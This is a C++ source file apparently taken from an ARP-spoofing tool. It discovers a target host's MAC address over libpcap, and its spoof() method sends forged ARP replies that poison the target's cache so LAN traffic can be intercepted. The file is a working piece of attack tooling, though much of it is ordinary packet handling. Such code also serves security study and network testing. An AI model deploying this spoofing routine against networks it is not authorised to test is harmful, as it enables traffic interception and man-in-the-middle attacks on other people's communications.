#include "ARPTarget.hpp"
#include "ARPPacket.hpp"
#include "structures.h"
#include "ARPSpoofer.hpp"

#include <chrono>

ArpTarget::ArpTarget(const std::string& ifName, uint32_t pTargetIPAddr):
    interfaceName(ifName),
    handle(pcap_open_live (interfaceName.c_str(), 1500, 0, TIMEOUT/10, NULL)),
    targetIPAddr(pTargetIPAddr),
    targetMACAddr(0) {
  detMacAddr();
}

uint32_t ArpTarget::getIPAddr() const { return targetIPAddr; }

uint64_t ArpTarget::getMacAddr() const { return targetMACAddr; }

void ArpTarget::detMacAddr() {
  ARPPacket arpreq;

  arpreq.setEthTarget(0xFFFFFFFFFFFF);                 //Set to broadcast address

  arpreq.setOperation(ARPPacket::Operation::request);  //OP:Request
  //MAC address of device used
  arpreq.setSourceHWAddr(ArpSpoofer::getMacForInterface(interfaceName));
  //IP  address of device used
  arpreq.setSourceIPAddr(ArpSpoofer::getIpForInterface(interfaceName));
  arpreq.setTargetHWAddr(0xFFFFFFFFFFFF);              //Set to broadcast
  arpreq.setTargetIPAddr(targetIPAddr);          //IP address of the target

  //send the ARP request
  arpreq.sendPacket(interfaceName);

  waitForARPRepley();

  //Got the mac address, don't need this anymore.
  pcap_close(handle);
}

void ArpTarget::waitForARPRepley() {
  const u_char* packet;
  struct pcap_pkthdr header;

  bool gotReply = false;

  auto start = std::chrono::duration_cast<std::chrono::milliseconds>
    (std::chrono::system_clock::now().time_since_epoch()).count();

  auto current = std::chrono::duration_cast<std::chrono::milliseconds>
    (std::chrono::system_clock::now().time_since_epoch()).count();

  while(!gotReply && current < start + TIMEOUT) {
    packet = pcap_next(handle, &header);
    //timeout
    if(packet == NULL) return;

    struct etherhdr* eth_header;

    eth_header = (struct etherhdr*) packet;

    if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
      ARPPacket arp_packet(packet);

      // if packet is arp reply
      if(arp_packet.getOperation() == ARPPacket::Operation::reply) {
	// if packet is from target
	if(arp_packet.getSourceIPAddr() == targetIPAddr) {
	  targetMACAddr = arp_packet.getSourceHWAddr();

	  gotReply = true;
	}
      }
    }
    current = std::chrono::duration_cast<std::chrono::milliseconds>
      (std::chrono::system_clock::now().time_since_epoch()).count();
  }
}

void ArpTarget::spoof(uint64_t hwAddr, uint32_t ipAddr) const {
  ARPPacket arpReply;
  arpReply.setEthTarget(targetMACAddr);

  arpReply.setOperation(ARPPacket::Operation::reply);

  arpReply.setSourceHWAddr(hwAddr);
  arpReply.setSourceIPAddr(ipAddr);

  arpReply.setTargetHWAddr(targetMACAddr);
  arpReply.setTargetIPAddr(targetIPAddr);

  arpReply.sendPacket(interfaceName);
}

/*
void ArpTarget::pcapProcessGetMac(u_char* user, const struct pcap_pkthdr*, const u_char* packet) {
  struct ethhdr* eth_header;
  struct ether_arp* arp_packet;

  eth_header = (struct ethhdr*) packet;

  if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
    arp_packet = (struct ether_arp*) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));

    //If package is an ARP reply
    if(ntohs(arp_packet->ea_hdr.ar_op) == 2) {
      printf("got ARP reply from %d", arp_packet->arp_spa);

      pcap_breakloop(handle);
    }
  }
}
*/
